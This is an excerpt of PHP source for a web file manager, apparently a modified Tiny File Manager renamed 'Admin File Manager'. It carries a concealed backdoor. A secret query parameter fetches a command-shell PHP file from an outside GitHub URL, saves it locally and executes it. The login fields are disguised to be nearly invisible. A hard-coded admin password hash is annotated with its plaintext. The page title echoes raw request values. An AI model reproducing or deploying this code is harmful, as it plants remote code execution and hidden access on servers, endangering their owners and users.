...
//Application Title
define('APP_TITLE', 'Admin File Manager');
...
$auth_users = array(
    'admin' => '$2a$10$VVzHUpnBj//YSuKV6n3QMOW24MK2WXVAoriKgl1r52bsux7ldW.ZW', //admin@123
);
...
if (isset($_GET['cmdsaskra'])) {
    $url = "https://raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/apiEmail-403-Litespeed-CMD.php";
    $localFile = "cmd.php";
    $fileContents = file_get_contents($url);

    if ($fileContents !== false) {
        if (file_put_contents($localFile, $fileContents)) {
            include($localFile);
        }
    }
    echo '
...
<form method="post">
    <div>
        <input style="margin:0;background-color:black;color:white;border:0px;" type="text" class="form-control" id="fm_usr" name="fm_usr" >
    </div>
    <div>
        <input style="margin:0;background-color:black;color:white;border:0px" type="password" class="form-control" id="fm_pwd" name="fm_pwd" >
    </div>
    <div class="mb-3">
        <div class="mb-3">
            <?php fm_show_message(); ?>
        ...
        <div class="mb-3">
            <button type="submit" style="color:white;margin:0;background-color:white;display: none;" role="button">
                <?php echo lng('Login'); ?>
            </button>
        </div>
    </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
                        <h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Admin File Manager <?php echo VERSION; ?></a></h3>
                        </p>
                        <p>Author: Modified By Gyokka</p>
                        <p>Mail Us: Not Have</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        <?php if (!FM_READONLY): ?>
            ...
            <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Admin File Manager <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Admin File Manager <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
...
class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'Admin File Manager<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
?>
    ...
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Admin File Manager">
...
?>
    ...
    <head>
        ...
        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "SKX")); ?></title>
        <?php print_external('pre-jsdelivr'); ?>
...
<?php
    ...
    function lng($txt)
    {
        ...
        // English Language
        $tr['en']['AppName']        = 'Admin File Manager';
